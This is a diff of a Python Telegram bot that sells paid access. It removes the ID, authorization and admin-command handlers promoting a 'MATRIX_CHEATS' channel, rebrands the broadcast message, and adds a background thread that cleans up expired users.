-    response = f'''🆔 USER IDENTIFICATION
-
-Your Telegram ID: {user_id}
-
-Use this ID when purchasing access.
-Contact @its_MATRIX_King for activation.'''
-    
-    bot.reply_to(message, response)
-
-def check_authorization(user_id):
-    """Helper function to check if user is authorized"""
-    users = read_users()
-    return user_id in admin_owner or user_id in users
-
-def unauthorized_message(user_name):
-    """Helper function to generate unauthorized message"""
-    return f'''⚠️ Unauthorized Access!
-
-Dear {user_name},
-You do not have permission to use this command.
-Please contact @its_MATRIX_King to purchase access.
-
-🔰 JOIN CHANNEL - @MATRIX_CHEATS
-🔰 OWNER - @its_MATRIX_King'''
-
-@bot.message_handler(commands=['admincmd'])
-def welcome_plan(message):
-    user_id = str(message.chat.id)
-
-    # Check if user is in owners.txt
-    with open('owner.txt', "r") as file:
-        owners = file.read().splitlines()
-
-    if user_id in owners:
-        user_name = message.from_user.first_name
-        response = f'''{user_name}, Admin Commands Are Here!!:
-
-        /add <userId> : Add a User.
-        /remove <userId> : Remove a User.
-        /allusers : Authorized Users List.
-        /broadcast : Broadcast a Message.
-        Channel - @MATRIX_CHEATS
-        Owner/Buy - @its_Matrix_King
-        '''
-        bot.reply_to(message, response)
-    else:
-        response = "You do not have permission to access admin commands."
-        bot.reply_to(message, response)
-
 
 # Handler for broadcasting a message
 @bot.message_handler(commands=['broadcast'])
@@ -656,8 +806,8 @@ def broadcast_message(message):
     if user_id in admin_owner:
         command = message.text.split(maxsplit=1)
         if len(command) > 1:
-            message_to_broadcast = "Message To All Users By MATRIX:\n\n" + command[1]
-            users = read_users() 
+            message_to_broadcast = "Message To All Users By Admin:\n\n" + command[1]
+            users = read_users()  # Get users from Redis
             if users:
                 for user in users:
                     try:
@@ -674,15 +824,37 @@ def broadcast_message(message):
 
     bot.reply_to(message, response)
 
+import threading
+
+def cleanup_thread():
+    while True:
+        clean_expired_users()
+        time.sleep(60)  # Check every minute
+
+# Start the cleanup thread
+cleanup_thread = threading.Thread(target=cleanup_thread, daemon=True)
+cleanup_thread.start()
+
+def cleanup_task():
+    while True:
+        clean_expired_users()
+        time.sleep(60)  # Check every minute
+
 def run_bot():
+    create_tables()
+    
+    # Start the cleanup thread
+    cleanup_thread = threading.Thread(target=cleanup_task, daemon=True)
+    cleanup_thread.start()
+    
     while True:
         try:
             print("Bot is running...")
-            bot.polling(none_stop=True, timeout=60)  # Add timeout to prevent long idle periods
+            bot.polling(none_stop=True, timeout=60)
         except Exception as e:
-            logging.error(f"An error occurred: {e}")
-            print(f"An error occurred: {e}")
-            time.sleep(15)  # Sleep before restarting the bot
+            logging.error(f"Bot error: {e}")
+            time.sleep(15)
 
 if __name__ == "__main__":
     run_bot()
+
